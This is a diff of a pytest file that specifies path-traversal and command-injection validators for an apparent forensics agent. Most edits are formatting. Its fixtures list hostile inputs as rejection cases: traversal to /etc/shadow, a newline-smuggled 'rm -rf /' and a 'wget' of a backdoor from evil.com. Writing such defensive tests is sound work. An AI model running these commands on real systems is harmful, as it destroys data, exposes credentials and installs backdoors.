@@ -15,23 +15,26 @@ Following 3-tier TDD structure:
 """
 
 import pytest
-from pathlib import Path
 
 # Conditional import for TDD - Classes may not exist yet
 try:
     from find_evil_agent.security.validators import (
-        PathValidator,
         CommandValidator,
+        PathValidator,
         SecurityValidationError,
     )
+
     VALIDATORS_AVAILABLE = True
 except ImportError:
     VALIDATORS_AVAILABLE = False
+
     # Placeholder classes for testing structure
     class PathValidator:
         pass
+
     class CommandValidator:
         pass
+
     class SecurityValidationError(Exception):
         pass
 
@@ -39,6 +42,7 @@ except ImportError:
 # ============================================================================
 # SPECIFICATION TESTS (Always Pass - Document Requirements)
 # ============================================================================
+
 
 class TestSecurityValidationSpecification:
     """Document security validation requirements and expected behavior."""
@@ -52,7 +56,7 @@ class TestSecurityValidationSpecification:
                 "Must block /etc/ system directory access",
                 "Must block /root/ root directory access",
                 "Must allow /var/log/ for forensics",
-                "Must validate against whitelist if provided"
+                "Must validate against whitelist if provided",
             ],
             "command_injection_prevention": [
                 "Must block semicolon (;) command chaining",
@@ -62,14 +66,14 @@ class TestSecurityValidationSpecification:
                 "Must block backtick (`) command substitution",
                 "Must block > output redirection",
                 "Must block < input redirection",
-                "Must block newline (\\n) injection"
+                "Must block newline (\\n) injection",
             ],
             "evidence_path_validation": [
                 "Must validate paths exist if filesystem check enabled",
                 "Must enforce whitelist if provided",
                 "Must reject paths outside whitelist",
-                "Must normalize paths before validation"
-            ]
+                "Must normalize paths before validation",
+            ],
         }
         assert len(requirements["path_traversal_prevention"]) == 6
         assert len(requirements["command_injection_prevention"]) == 8
@@ -81,17 +85,17 @@ class TestSecurityValidationSpecification:
             "PathValidator": {
                 "methods": ["validate_path", "__init__"],
                 "raises": ["SecurityValidationError"],
-                "accepts": ["whitelist: list[str] | None"]
+                "accepts": ["whitelist: list[str] | None"],
             },
             "CommandValidator": {
                 "methods": ["validate_command", "__init__"],
                 "raises": ["SecurityValidationError"],
-                "patterns": ["injection_patterns", "dangerous_chars"]
+                "patterns": ["injection_patterns", "dangerous_chars"],
             },
             "SecurityValidationError": {
                 "inherits": "Exception",
-                "purpose": "Raised when validation fails"
-            }
+                "purpose": "Raised when validation fails",
+            },
         }
         assert "PathValidator" in interfaces
         assert "CommandValidator" in interfaces
@@ -105,10 +109,10 @@ class TestSecurityValidationSpecification:
                 "DynamicCommandBuilder uses CommandValidator",
                 "Validators called before LLM invocation",
                 "SecurityValidationError propagated to caller",
-                "Failed validation prevents command execution"
+                "Failed validation prevents command execution",
             ],
             "workflow_position": "Pre-execution validation (before SSH)",
-            "error_handling": "Fail secure - reject on validation error"
+            "error_handling": "Fail secure - reject on validation error",
         }
         assert len(integration["command_builder_integration"]) == 5
         assert integration["workflow_position"] == "Pre-execution validation (before SSH)"
@@ -117,6 +121,7 @@ class TestSecurityValidationSpecification:
 # ============================================================================
 # STRUCTURE TESTS (Skipped Until Implementation)
 # ============================================================================
+
 
 @pytest.mark.skipif(not VALIDATORS_AVAILABLE, reason="Validators not implemented yet")
 class TestPathValidatorStructure:
@@ -129,8 +134,8 @@ class TestPathValidatorStructure:
     def test_path_validator_has_validate_method(self):
         """PathValidator must have validate_path method."""
         validator = PathValidator()
-        assert hasattr(validator, 'validate_path')
-        assert callable(getattr(validator, 'validate_path'))
+        assert hasattr(validator, "validate_path")
+        assert callable(validator.validate_path)
 
     def test_path_validator_accepts_whitelist(self):
         """PathValidator must accept optional whitelist."""
@@ -153,13 +158,14 @@ class TestCommandValidatorStructure:
     def test_command_validator_has_validate_method(self):
         """CommandValidator must have validate_command method."""
         validator = CommandValidator()
-        assert hasattr(validator, 'validate_command')
-        assert callable(getattr(validator, 'validate_command'))
+        assert hasattr(validator, "validate_command")
+        assert callable(validator.validate_command)
 
 
 # ============================================================================
 # PATH TRAVERSAL TESTS (Skipped Until Implementation)
 # ============================================================================
+
 
 @pytest.mark.skipif(not VALIDATORS_AVAILABLE, reason="Validators not implemented yet")
 class TestPathTraversalPrevention:
@@ -219,6 +225,7 @@ class TestPathTraversalPrevention:
 # WHITELIST VALIDATION TESTS (Skipped Until Implementation)
 # ============================================================================
 
+
 @pytest.mark.skipif(not VALIDATORS_AVAILABLE, reason="Validators not implemented yet")
 class TestWhitelistEnforcement:
     """Test evidence path whitelist enforcement."""
@@ -237,10 +244,7 @@ class TestWhitelistEnforcement:
 
     def test_whitelist_with_multiple_paths(self):
         """Must support multiple whitelisted paths."""
-        validator = PathValidator(whitelist=[
-            "/mnt/evidence",
-            "/var/log"
-        ])
+        validator = PathValidator(whitelist=["/mnt/evidence", "/var/log"])
         validator.validate_path("/mnt/evidence/memory.raw")
         validator.validate_path("/var/log/syslog")
         with pytest.raises(SecurityValidationError):
@@ -257,6 +261,7 @@ class TestWhitelistEnforcement:
 # ============================================================================
 # COMMAND INJECTION TESTS (Skipped Until Implementation)
 # ============================================================================
+
 
 @pytest.mark.skipif(not VALIDATORS_AVAILABLE, reason="Validators not implemented yet")
 class TestCommandInjectionPrevention:
@@ -314,7 +319,9 @@ class TestCommandInjectionPrevention:
         """Must accept safe commands."""
         validator = CommandValidator()
         # Should not raise
-        validator.validate_command("volatility -f /mnt/evidence/memory.raw --profile=Win10x64 pslist")
+        validator.validate_command(
+            "volatility -f /mnt/evidence/memory.raw --profile=Win10x64 pslist"
+        )
         validator.validate_command("strings /mnt/evidence/disk.dd")
         validator.validate_command("grep -i error /var/log/syslog")
 
@@ -322,6 +329,7 @@ class TestCommandInjectionPrevention:
 # ============================================================================
 # EDGE CASE TESTS (Skipped Until Implementation)
 # ============================================================================
+
 
 @pytest.mark.skipif(not VALIDATORS_AVAILABLE, reason="Validators not implemented yet")
 class TestValidatorEdgeCases:
@@ -395,6 +403,7 @@ class TestValidatorEdgeCases:
 # INTEGRATION TESTS (Skipped Until Implementation)
 # ============================================================================
 
+
 @pytest.mark.skipif(not VALIDATORS_AVAILABLE, reason="Validators not implemented yet")
 class TestSecurityValidationIntegration:
     """Test integration with command builder and real usage."""
@@ -426,6 +435,7 @@ class TestSecurityValidationIntegration:
 # TEST FIXTURES
 # ============================================================================
 
+
 @pytest.fixture
 def safe_evidence_paths():
     """Safe evidence paths for testing."""
@@ -433,7 +443,7 @@ def safe_evidence_paths():
         "/mnt/evidence/disk.dd",
         "/mnt/evidence/memory.raw",
         "/var/log/syslog",
-        "/var/log/auth.log"
+        "/var/log/auth.log",
     ]
 
 
@@ -447,7 +457,7 @@ def malicious_paths():
         "../../etc/shadow",
         "~/sensitive/data",
         "/var/www/html/shell.php",
-        "/mnt/evidence/../../../etc/passwd"
+        "/mnt/evidence/../../../etc/passwd",
     ]
 
 
@@ -459,7 +469,7 @@ def safe_commands():
         "strings /mnt/evidence/disk.dd",
         "grep -i error /var/log/syslog",
         "fls -r /mnt/evidence/disk.dd",
-        "icat /mnt/evidence/disk.dd 128"
+        "icat /mnt/evidence/disk.dd 128",
     ]
 
 
@@ -473,13 +483,14 @@ def malicious_commands():
         "echo $(whoami)",
         "echo `cat /etc/shadow`",
         "strings /tmp/file\nrm -rf /",
-        "ls & wget http://evil.com/backdoor.sh"
+        "ls & wget http://evil.com/backdoor.sh",
     ]
 
 
 # ============================================================================
 # SUMMARY
 # ============================================================================
+
 
 def test_security_validation_test_summary():
     """Summary of security validation test coverage."""
@@ -501,8 +512,8 @@ def test_security_validation_test_summary():
             "Redirection blocking (>, <)",
             "Newline injection prevention",
             "Edge cases (empty, unicode, long inputs)",
-            "Integration with command builder"
-        ]
+            "Integration with command builder",
+        ],
     }
     assert test_summary["total_tests"] >= 35, "Must have 35+ security tests"
     assert len(test_summary["coverage"]) == 8, "Must cover 8 attack categories"
